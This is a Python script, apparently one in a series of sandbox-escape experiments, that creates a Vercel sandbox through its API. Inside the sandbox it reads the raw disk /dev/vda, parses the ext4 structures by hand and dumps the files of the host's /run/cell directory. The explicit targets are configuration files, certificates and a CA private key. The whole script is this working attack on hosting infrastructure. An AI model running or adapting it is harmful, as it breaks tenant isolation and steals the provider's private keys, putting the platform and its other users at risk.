# 实验J31: ext4 解析 - 从目录块(538849)反查 inode → extent tree → 提取 celld.toml/xkernel.toml 及同目录全部文件
# 依据: J30 命中 OFF=538849 目录项 "celld.toml xkernel.toml"; mountinfo 泄露 /run/cell/ca-cert.pem
# 目标: /run/cell 目录内配置/证书/私钥, 尤其是 ca-key.pem 类私钥
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=200):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj31"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import struct

DEV = "/dev/vda"
DIR_HIT = 538849  # J30 命中的目录项物理偏移 (0 MB 区)

def u16(d, o): return struct.unpack_from("<H", d, o)[0]
def u32(d, o): return struct.unpack_from("<I", d, o)[0]

def rd(f, off, n):
    f.seek(off)
    return f.read(n)

f = open(DEV, "rb", buffering=0)

# ---- GPT 分区探测: 找到 ext4 分区起始 -------
part_start = 0
f.seek(512)
gpt = f.read(8)
print("gpt magic:", gpt, flush=True)
if gpt == b"EFI PART":
    f.seek(1024)
    pe = f.read(128)
    first_lba = struct.unpack_from("<Q", pe, 32)[0]
    part_start = first_lba * 512
    print("GPT part1 start LBA=%d -> phys %d" % (first_lba, part_start), flush=True)

# ---- 找 ext4 superblock (0xEF53) -------
sb_phys = None
for base in [part_start, 0, 1048576, 2097152]:
    sb = rd(f, base + 1024, 1024)
    if u16(sb, 0x38) == 0xEF53:
        sb_phys = base + 1024
        break
if sb_phys is None:
    # 暴力扫前 32MB (每 4K 对齐)
    for off in range(0, 32*1024*1024, 4096):
        sb = rd(f, off + 1024, 1024)
        if len(sb) < 1024:
            break
        if u16(sb, 0x38) == 0xEF53 and u32(sb, 0x18) <= 7:
            sb_phys = off + 1024
            part_start = off
            break
print("sb_phys=%s part_start=%d" % (sb_phys, part_start), flush=True)
if sb_phys is None:
    raise SystemExit("no ext4 superblock found")

sb = rd(f, sb_phys, 1024)
bs = 1024 << u32(sb, 0x18)
ino_size = u16(sb, 0x58)
first_data = u32(sb, 0x14)
bpg = u32(sb, 0x20)
desc_size = u16(sb, 0xFE) or 32
print("bs=%d ino_size=%d first_data=%d bpg=%d desc_size=%d" %
      (bs, ino_size, first_data, bpg, desc_size), flush=True)

dir_blk = (DIR_HIT - part_start) // bs
grp = (dir_blk - first_data) // bpg
print("dir block %d (phys %d) in group %d" % (dir_blk, dir_blk*bs+part_start, grp), flush=True)

gdt_off = (2 if bs == 1024 else 1) * bs + grp * desc_size
gdt = rd(f, part_start + gdt_off, 64)
ino_tbl_blk = u32(gdt, 0x8) | (u32(gdt, 0x14) << 32) if desc_size >= 64 else u32(gdt, 0x8)
print("group%d inode_table_block=%d" % (grp, ino_tbl_blk), flush=True)

# ---- 解析目录块全部目录项 ----
dstart = part_start + dir_blk * bs
d = rd(f, dstart, bs)
entries = []
off = 0
while off + 8 <= bs:
    ino, rec_len, name_len, ftype = struct.unpack_from("<IHBB", d, off)
    if ino == 0 or rec_len == 0:
        break
    name = d[off+8:off+8+name_len].decode(errors="replace")
    entries.append((ino, name, ftype))
    off += rec_len
print("DIR(%d) entries: %r" % (dstart, [(n, t) for _, n, t in entries]), flush=True)

# ---- inode 读取与 extent 提取 ----
def read_inode(f, ino):
    off = part_start + ino_tbl_blk * bs + (ino - 1) * ino_size
    return rd(f, off, ino_size)

def read_extents(f, hdr, depth, limit):
    # hdr: 60B (extent header + entries), depth: 当前层
    n = u16(hdr, 2)
    out = b""
    for i in range(n):
        e = hdr[12 + i*12 : 12 + i*12 + 12]
        if depth == 0:
            elen = u16(e, 4)
            start = u32(e, 8) | (u16(e, 6) << 32)
            for b in range(elen):
                out += rd(f, part_start + (start + b) * bs, bs)
                if len(out) >= limit:
                    return out[:limit]
        else:
            leaf = u32(e, 4) | (u16(e, 8) << 32)
            lhdr = rd(f, part_start + leaf * bs, bs)
            out += read_extents(f, lhdr[:60], depth - 1, limit - len(out))
            if len(out) >= limit:
                return out[:limit]
    return out

def get_file(f, ino, limit=16384):
    inode = read_inode(f, ino)
    if len(inode) < 0x70:
        return None
    fsize = u32(inode, 0x04) | (u32(inode, 0x6C) << 32)
    flags = u32(inode, 0x20)
    magic = u16(inode, 0x28)
    if magic != 0xF30A:
        return None
    depth = u16(inode, 0x2E)
    data = read_extents(f, inode[0x28:0x28+60], depth, min(fsize, limit))
    return data[:fsize] if fsize < len(data) else data

# ---- 优先提取: celld.toml / xkernel.toml / ca-key / ca-cert ----
want = ["celld.toml", "xkernel.toml", "ca-key.pem", "ca-cert.pem", "ca-key", "ca.crt", "ca.key"]
for ino, name, ftype in entries:
    if ftype == 7:  # symlink: i_block[0:60] 即 target
        inode = read_inode(f, ino)
        tgt = inode[0x28:0x28+60].split(b"\x00")[0].decode(errors="replace")
        print("SYMLINK %s -> %s" % (name, tgt), flush=True)
        continue
    if ftype != 1:
        continue
    data = get_file(f, ino)
    if data is None:
        print("FILE %s: read failed" % name, flush=True)
        continue
    print("===== FILE %s (%d B) =====" % (name, len(data)), flush=True)
    txt = data.decode(errors="replace")
    print(txt[:8000], flush=True)
    print("===== END %s =====" % name, flush=True)
'''
run_cmd(sid, SCAN, "ext4-extract", wait=True, timeout=120000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
